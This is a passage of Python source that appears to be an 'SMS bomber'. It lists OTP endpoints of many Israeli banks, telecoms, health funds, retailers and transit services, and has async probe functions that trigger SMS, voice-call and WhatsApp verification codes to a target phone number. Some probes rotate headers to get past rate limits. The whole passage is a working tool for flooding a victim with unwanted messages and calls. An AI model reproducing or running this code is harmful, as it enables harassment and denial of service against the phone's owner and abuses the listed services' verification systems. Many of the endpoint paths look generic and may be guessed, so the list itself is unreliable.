    _mk_json("JobMaster SMS", "https://www.jobmaster.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Lametayel SMS", "https://www.lametayel.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("TerminalX SMS", "https://www.terminalx.com/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Castro SMS", "https://www.castro.com/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Fox SMS", "https://www.fox.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Steimatzky SMS", "https://www.steimatzky.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Shilav SMS", "https://www.shilav.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Homecenter SMS", "https://www.homecenter.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("OfficeDepot SMS", "https://www.officedepot.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bug SMS", "https://www.bug.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("LastPrice SMS", "https://www.lastprice.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("ToysRUs SMS", "https://www.toysrus.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("CafeCafe SMS", "https://www.cafecafe.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Landwer SMS", "https://www.landwer.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("JapanJapan SMS", "https://www.japan-japan.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Arkia SMS", "https://www.arkia.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Israir SMS", "https://www.israir.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("ElAl SMS", "https://www.elal.com/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Egged SMS", "https://www.egged.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Dan SMS", "https://www.dan.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Ahuzot SMS", "https://www.ahuzot.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Shvoong SMS", "https://www.shvoong.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Micropay SMS", "https://www.micropay.co.il/extApi/sendOtp.php",
             lambda p: {"phone": p0(p), "type": "sms", "get": "1"}),
    _mk_json("Golan Voice", "https://my.golantelecom.co.il/api/sendOtpVoice",
             lambda p: {"phone": p0(p), "method": "voice"}),
    _mk_json("Pelephone Voice", "https://my.pelephone.co.il/api/otp/voice",
             lambda p: {"phone": p0(p), "type": "voice"}),
    _mk_json("Bezeq Voice", "https://www.bezeq.co.il/api/otp/voice",
             lambda p: {"phone": p0(p), "channel": "call"}),
    _mk_json("Shufersal Voice", "https://www.shufersal.co.il/online/he/login/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Pango Voice", "https://www.pango.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Cellopark Voice", "https://www.cellopark.co.il/api/auth/otp",
             lambda p: {"phone": p0(p), "channel": "call"}),
    _mk_json("Buyme Voice", "https://www.buyme.co.il/api/otp",
             lambda p: {"phone": p0(p), "method": "voice"}),
    _mk_json("RavKav Voice", "https://www.ravkavonline.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Micropay Voice", "https://www.micropay.co.il/extApi/sendOtp.php",
             lambda p: {"phone": p0(p), "type": "voice", "get": "1"}),
    _mk_json("Bolt Voice", "https://user.live.boltsvc.net/signup/phone/verify",
             lambda p: {"phone": pplus(p), "version": "PH.2.90", "channel": "voice"}),
    _mk_json("Hamal Voice", "https://users-auth.hamal.co.il/auth/send-auth-code",
             lambda p: {"value": p0(p), "type": "phone", "projectId": "1", "channel": "voice"}),
    _mk_json("Cellcom WA", "https://digital-api.cellcom.co.il/api/otp/Step1",
             lambda p: {"PhoneNumber": p972(p), "SendTextAsVoice": False, "Channel": "WhatsApp"}),
    _mk_json("Partner WA", "https://my.partner.co.il/api/otp/send",
             lambda p: {"msisdn": p0(p), "channel": "whatsapp"}),
    _mk_json("Hot WA", "https://www.hotmobile.co.il/online_services/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("019 WA", "https://www.019mobile.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Golan WA", "https://my.golantelecom.co.il/api/sendOtp",
             lambda p: {"phone": p0(p), "method": "whatsapp"}),
    _mk_json("Pelephone WA", "https://my.pelephone.co.il/api/otp",
             lambda p: {"phone": p0(p), "type": "whatsapp"}),
    _mk_json("PayBox WA", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Bit WA", "https://www.bitpay.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("10bis WA", "https://www.10bis.co.il/NextApi/GetAuthenticationToken",
             lambda p: {"phoneNumber": p0(p), "culture": "he-IL", "sendMethod": "whatsapp"}),
    _mk_json("Wolt WA", "https://restaurant-api.wolt.com/v1/guest/login",
             lambda p: {"phone_number": pplus(p), "method": "whatsapp"}),
    _mk_json("Gett WA", "https://api.gett.com/v1/login/otp",
             lambda p: {"phone": pplus(p), "channel": "whatsapp"}),
    _mk_json("Hapoalim WA", "https://login.bankhapoalim.co.il/server/sendOtp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Leumi WA", "https://hb2.bankleumi.co.il/eBanking/SO/SendOtp",
             lambda p: {"phone": p0(p), "delivery": "whatsapp"}),
    _mk_json("Isracard WA", "https://digital.isracard.co.il/services/Proxy/CodeLogin",
             lambda p: {"phone": p0(p), "method": "whatsapp"}),
    _mk_json("Shufersal WA", "https://www.shufersal.co.il/online/he/login/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("RamiLevy WA", "https://www.ramilevy-mobile.co.il/api/otp",
             lambda p: {"phone": p0(p), "type": "whatsapp"}),
    _mk_json("Pango WA", "https://www.pango.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Micropay WA", "https://www.micropay.co.il/extApi/sendOtp.php",
             lambda p: {"phone": p0(p), "type": "whatsapp", "get": "1"}),
    _mk_json("Meuhedet OTP", "https://online.meuhedet.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Clalit OTP", "https://www.clalit.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Maccabi OTP", "https://www.maccabi4u.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Leumit OTP", "https://www.leumit.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Israel Rail OTP", "https://www.rail.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Moovit OTP", "https://moovitapp.com/api/otp",
             lambda p: {"phone": pplus(p)}),
    _mk_json("CafeCafe Voice", "https://www.cafecafe.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Aroma Voice", "https://www.aroma.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Dominos Voice", "https://www.dominos.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("McD Voice", "https://www.mcdonalds.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Clalit Voice", "https://www.clalit.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Maccabi Voice", "https://www.maccabi4u.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Meuhedet WA", "https://online.meuhedet.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Clalit WA", "https://www.clalit.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Maccabi WA", "https://www.maccabi4u.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
    _mk_json("Rail WA", "https://www.rail.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "whatsapp"}),
]

# ── EXTRA — additional surfaces ──
EXTRA = [
    _mk_json("Mishloha2", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
             lambda p: {"phoneNumber": p0(p), "sourceFrom": "mobileApp", "sessionID": str(uuid.uuid4())}),
    _mk_json("Cibus OTP", "https://api.cibus.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Sodexo IL", "https://www.sodexo.co.il/api/auth/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("Wecom Auth", "https://www.wecom.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("TerminalX API", "https://www.terminalx.com/api/customer/otp",
             lambda p: {"phone": p0(p), "telephone": p0(p)}),
    _mk_json("Fox API", "https://www.fox.co.il/api/customer/sendOtp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Castro API", "https://www.castro.com/api/customer/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Golf API", "https://www.golf.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Renuar API", "https://www.renuar.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Laline API", "https://www.laline.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("ACE Customer", "https://www.ace.co.il/api/customer/sendOtp",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("SuperPharm Shop", "https://shop.super-pharm.co.il/api/auth/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("RamiLevy API", "https://www-api.rami-levy.co.il/api/v2/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Shufersal Login", "https://www.shufersal.co.il/online/he/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Victory Online", "https://www.victoryonline.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Yochananof OTP", "https://www.yochananof.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Tiv Taam OTP", "https://www.tivtaam.co.il/api/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Osher Ad OTP", "https://www.osherad.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("PayBox Auth", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bit Pay", "https://www.bitpay.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Isracard Code", "https://digital.isracard.co.il/services/Proxy/CodeLogin",
             lambda p: {"phone": p0(p)}),
    _mk_json("Cal OTP", "https://www.cal-online.co.il/api/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("Max OTP", "https://www.max.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_form("Hascala CF7", "https://hascala.co.il/wp-json/contact-form-7/v1/contact-forms/497/feedback",
             lambda p: f"phone={p0(p)}&your-phone={p0(p)}&tel={p0(p)}"),
    _mk_json("Stips Phone", "https://stips.co.il/api",
             lambda p: {"name": "phone.validation.send_code", "phone": p0(p)}),
    _mk_json("Story MagicETL", "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
             lambda p: {"phone": p0(p), "countryCode": "972"}),
    _mk_json("CityCar SMS", "https://proxy1.citycar.co.il/api/verify/login",
             lambda p: {"phoneNumber": pplus(p), "verifyChannel": 0}),
    _mk_json("CityCar Call", "https://proxy1.citycar.co.il/api/verify/login",
             lambda p: {"phoneNumber": pplus(p), "verifyChannel": 1}),
    _mk_json("Hamal Auth", "https://users-auth.hamal.co.il/auth/send-auth-code",
             lambda p: {"value": p0(p), "type": "phone", "projectId": "1"}),
    _mk_json("DutyFree GraphQL", "https://www.dutyfree.co.il/graphql",
             lambda p: {"operationName": "SendOtpCode", "variables": {"value": p0(p)},
                        "query": "mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }"}),
    _mk_json("Atmos PizzaHut", "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode",
             lambda p: {"phone": p0(p)}),
    _mk_json("DIBS OTP", "https://rest-api.dibs-app.com/otps",
             lambda p: {"phoneNumber": pplus(p)}),
    _mk_json("PapaJohns Aff", "https://www.papajohns.co.il/_a/aff_otp_auth",
             lambda p: {"phone": p0(p)}),
    _mk_json("Homework LNET2", "https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode",
             lambda p: {"phone": p0(p)}),
    _mk_json("Inter Azure", "https://api-iba-rtl.azurewebsites.net/api/users/authenticate",
             lambda p: {"phone": p0(p)}),
]

# ── EXTRA2 — more endpoints ──
EXTRA2 = [
    _mk_json("Cibus API", "https://api.cibus.co.il/v1/otp/send",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("TenBis Token", "https://www.10bis.co.il/NextApi/GetAuthenticationToken",
             lambda p: {"phoneNumber": p0(p), "culture": "he-IL"}),
    _mk_json("Wolt SMS", "https://restaurant-api.wolt.com/v1/guest/login",
             lambda p: {"phone_number": pplus(p), "method": "sms"}),
    _mk_json("Wolt Call", "https://restaurant-api.wolt.com/v1/guest/login",
             lambda p: {"phone_number": pplus(p), "method": "call"}),
    _mk_json("Gett SMS", "https://api.gett.com/v1/login/otp",
             lambda p: {"phone": pplus(p)}),
    _mk_json("Gett Call", "https://api.gett.com/v1/login/otp",
             lambda p: {"phone": pplus(p), "channel": "voice"}),
    _mk_json("Mishloha Mobile", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
             lambda p: {"phoneNumber": p0(p), "sourceFrom": "mobileApp", "sessionID": str(uuid.uuid4())}),
    _mk_json("PapaJohns OTP", "https://www.papajohns.co.il/_a/aff_otp_auth",
             lambda p: {"phone": p0(p)}),
    _mk_json("Atmos PH", "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode",
             lambda p: {"phone": p0(p)}),
    _mk_json("DIBS Phone", "https://rest-api.dibs-app.com/otps",
             lambda p: {"phoneNumber": pplus(p)}),
    _mk_json("Dominos IL API", "https://www.dominos.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("McDonalds IL API", "https://www.mcdonalds.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Aroma OTP", "https://www.aroma.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("CafeCafe OTP", "https://www.cafecafe.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("JapanJapan OTP", "https://www.japan-japan.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Landwer OTP", "https://www.landwer.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Cellcom SMS Fast", "https://digital-api.cellcom.co.il/api/otp/Step1",
             lambda p: {"PhoneNumber": p972(p), "SendTextAsVoice": False}),
    _mk_json("Cellcom Voice Fast", "https://digital-api.cellcom.co.il/api/otp/Step1",
             lambda p: {"PhoneNumber": p972(p), "SendTextAsVoice": True}),
    _mk_json("Partner SMS", "https://my.partner.co.il/api/otp/send",
             lambda p: {"msisdn": p0(p)}),
    _mk_json("Partner Call", "https://my.partner.co.il/api/otp/voice",
             lambda p: {"msisdn": p0(p)}),
    _mk_json("HotMobile SMS", "https://www.hotmobile.co.il/online_services/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Golan SMS2", "https://my.golantelecom.co.il/api/sendOtp",
             lambda p: {"phone": p0(p), "method": "sms"}),
    _mk_json("Golan Voice2", "https://my.golantelecom.co.il/api/sendOtpVoice",
             lambda p: {"phone": p0(p), "method": "voice"}),
    _mk_json("Pelephone SMS2", "https://my.pelephone.co.il/api/otp",
             lambda p: {"phone": p0(p), "type": "sms"}),
    _mk_json("Pelephone Voice2", "https://my.pelephone.co.il/api/otp/voice",
             lambda p: {"phone": p0(p), "type": "voice"}),
    _mk_json("012 SMS2", "https://www.012mobile.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("019 SMS2", "https://www.019mobile.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Wecom SMS2", "https://www.wecom.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bezeq SMS2", "https://www.bezeq.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Pango SMS", "https://www.pango.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Pango Voice", "https://www.pango.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Cellopark SMS", "https://www.cellopark.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Ahuzot SMS", "https://www.ahuzot.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("RavKav SMS", "https://www.ravkavonline.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Rail SMS", "https://www.rail.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Moovit SMS", "https://moovitapp.com/api/otp",
             lambda p: {"phone": pplus(p)}),
    _mk_json("CityCar SMS2", "https://proxy1.citycar.co.il/api/verify/login",
             lambda p: {"phoneNumber": pplus(p), "verifyChannel": 0}),
    _mk_json("CityCar Voice2", "https://proxy1.citycar.co.il/api/verify/login",
             lambda p: {"phoneNumber": pplus(p), "verifyChannel": 1}),
    _mk_json("Bolt Verify", "https://user.live.boltsvc.net/signup/phone/verify",
             lambda p: {"phone": pplus(p), "version": "PH.2.90"}),
    _mk_json("RamiLevy OTP2", "https://www-api.rami-levy.co.il/api/v2/login/otp",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("Shufersal OTP2", "https://www.shufersal.co.il/online/he/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("SuperPharm OTP2", "https://shop.super-pharm.co.il/api/auth/otp",
             lambda p: {"mobile": p0(p), "phone": p0(p)}),
    _mk_json("Victory OTP2", "https://www.victoryonline.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Yochananof OTP2", "https://www.yochananof.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("TivTaam OTP2", "https://www.tivtaam.co.il/api/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("OsherAd OTP2", "https://www.osherad.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Keshet OTP", "https://www.keshet-teamim.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("AM PM OTP", "https://www.ampm.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Yellow OTP", "https://www.yellow.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("ACE OTP2", "https://www.ace.co.il/api/customer/sendOtp",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("TerminalX OTP2", "https://www.terminalx.com/api/customer/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Fox OTP2", "https://www.fox.co.il/api/customer/sendOtp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Castro OTP2", "https://www.castro.com/api/customer/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Golf OTP2", "https://www.golf.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Renuar OTP2", "https://www.renuar.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Laline OTP2", "https://www.laline.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Steimatzky OTP2", "https://www.steimatzky.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Ivory OTP2", "https://www.ivory.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("KSP OTP2", "https://www.ksp.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bug OTP2", "https://www.bug.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("LastPrice OTP2", "https://www.lastprice.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Homecenter OTP2", "https://www.homecenter.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Shilav OTP2", "https://www.shilav.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("ToysRUs OTP2", "https://www.toysrus.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("OfficeDepot OTP2", "https://www.officedepot.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("PayBox OTP2", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bit OTP2", "https://www.bitpay.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Isracard OTP2", "https://digital.isracard.co.il/services/Proxy/CodeLogin",
             lambda p: {"phone": p0(p)}),
    _mk_json("Cal OTP2", "https://www.cal-online.co.il/api/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("Max OTP2", "https://www.max.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("PayNGo OTP2", "https://www.payngo.co.il/login/init/phone/",
             lambda p: {"phone": p0(p)}),
    _mk_json("Micropay OTP", "https://www.micropay.co.il/extApi/sendOtp.php",
             lambda p: {"phone": p0(p), "type": "sms", "get": "1"}),
    _mk_json("Yad2 OTP2", "https://www.yad2.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Madlan OTP2", "https://www.madlan.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Drushim OTP2", "https://www.drushim.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("AllJobs OTP2", "https://www.alljobs.co.il/api/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("JobMaster OTP2", "https://www.jobmaster.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Issta OTP2", "https://www.issta.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Lametayel OTP2", "https://www.lametayel.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Buyme OTP2", "https://www.buyme.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Rest OTP2", "https://www.rest.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Shvoong OTP2", "https://www.shvoong.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Globes OTP2", "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
             lambda p: {"phone": p0(p)}),
    _mk_form("Globes Form2", "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
             lambda p: f"phone={p0(p)}"),
    _mk_json("Hamal OTP2", "https://users-auth.hamal.co.il/auth/send-auth-code",
             lambda p: {"value": p0(p), "type": "phone", "projectId": "1"}),
    _mk_json("DutyFree OTP2", "https://www.dutyfree.co.il/graphql",
             lambda p: {"operationName": "SendOtpCode", "variables": {"value": p0(p)},
                        "query": "mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }"}),
    _mk_json("Stips OTP2", "https://stips.co.il/api",
             lambda p: {"phone": p0(p)}),
    _mk_json("Story OTP2", "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
             lambda p: {"phone": p0(p)}),
    _mk_json("Zinger OTP2", "https://www.zinger-organic.com/frontend/getindexcall",
             lambda p: {"phone": p0(p)}),
    _mk_json("Homework OTP2", "https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode",
             lambda p: {"phone": p0(p)}),
    _mk_json("Inter OTP2", "https://api-iba-rtl.azurewebsites.net/api/users/authenticate",
             lambda p: {"phone": p0(p)}),
]

# ── LIVE_JSON_NEW — most recent batch ──
LIVE_JSON_NEW = [
    _mk_json("Bit Phone", "https://www.bitpay.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Bit Voice2", "https://www.bitpay.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("PayBox SMS2", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phoneNumber": p0(p), "type": "sms"}),
    _mk_json("PayBox Call2", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phoneNumber": p0(p), "type": "voice"}),
    _mk_json("Isracard SMS2", "https://digital.isracard.co.il/services/Proxy/CodeLogin",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Isracard Call2", "https://digital.isracard.co.il/services/Proxy/CodeLoginVoice",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Cal Voice2", "https://www.cal-online.co.il/api/otp",
             lambda p: {"mobile": p0(p), "channel": "voice"}),
    _mk_json("Max Voice2", "https://www.max.co.il/api/auth/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Leumi SMS2", "https://hb2.bankleumi.co.il/eBanking/SO/SendOtp",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Leumi Call2", "https://hb2.bankleumi.co.il/eBanking/SO/SendOtpVoice",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Hapoalim SMS2", "https://login.bankhapoalim.co.il/server/sendOtp",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Hapoalim Call2", "https://login.bankhapoalim.co.il/server/sendOtpVoice",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Discount SMS2", "https://start.telebank.co.il/LoginServices/otp",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Mizrahi SMS2", "https://www.mizrahi-tefahot.co.il/login/otp",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Cibus SMS2", "https://api.cibus.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Cibus Voice2", "https://api.cibus.co.il/api/otp/send",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Sodexo SMS2", "https://www.sodexo.co.il/api/auth/otp",
             lambda p: {"mobile": p0(p), "channel": "sms"}),
    _mk_json("Sodexo Voice2", "https://www.sodexo.co.il/api/auth/otp",
             lambda p: {"mobile": p0(p), "channel": "voice"}),
]


# ─────────────────────────────────────────────
# SOLID MULTI-PROBE
# ─────────────────────────────────────────────
async def solid_mishloha(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
         {"phoneNumber": p, "sourceFrom": "desktopHomePage", "sessionID": str(uuid.uuid4())}),
        ("https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
         {"phoneNumber": p, "sourceFrom": "mobileApp", "sessionID": str(uuid.uuid4())}),
    ])


async def solid_atmos(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"phone": p}),
        ("https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"phoneNumber": p}),
    ])


async def solid_dibs(session, phone):
    return await _probe_json(session, [
        ("https://rest-api.dibs-app.com/otps", {"phoneNumber": pplus(phone)}),
        ("https://rest-api.dibs-app.com/otps", {"phoneNumber": p0(phone)}),
    ])


async def solid_papajohns(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": p}),
        ("https://www.papajohns.co.il/_a/aff_otp_auth", {"telephone": p, "phone": p}),
    ], {"Origin": "https://www.papajohns.co.il", "Referer": "https://www.papajohns.co.il/"})


async def solid_citycar(session, phone):
    return await _probe_json(session, [
        ("https://proxy1.citycar.co.il/api/verify/login",
         {"phoneNumber": pplus(phone), "verifyChannel": 0}),
        ("https://proxy1.citycar.co.il/api/verify/login",
         {"phoneNumber": pplus(phone), "verifyChannel": 1}),
    ])


async def solid_cellcom(session, phone):
    headers = {"Origin": "https://www.cellcom.co.il", "Referer": "https://www.cellcom.co.il/"}
    for voice in (False, True):
        try:
            status, _ = await put_json(
                session,
                "https://digital-api.cellcom.co.il/api/otp/Step1",
                rotate_headers({**headers, "Accept": "application/json",
                                "Content-Type": "application/json"}),
                {"PhoneNumber": p972(phone), "SendTextAsVoice": voice},
                timeout=6.0,
            )
            if status in (200, 201, 202, 204):
                return True
        except Exception:
            pass
    return False


async def solid_hamal(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://users-auth.hamal.co.il/auth/send-auth-code",
         {"value": p, "type": "phone", "projectId": "1"}),
        ("https://users-auth.hamal.co.il/auth/send-auth-code",
         {"phone": p, "type": "phone"}),
    ])


async def solid_dutyfree(session, phone):
    p = p0(phone)
    q = 'mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }'
    return await _probe_json(session, [
        ("https://www.dutyfree.co.il/graphql",
         {"operationName": "SendOtpCode", "variables": {"value": p}, "query": q}),
    ], {"Origin": "https://www.dutyfree.co.il", "Referer": "https://www.dutyfree.co.il/"})


async def solid_10bis(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p, "culture": "he-IL"}),
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
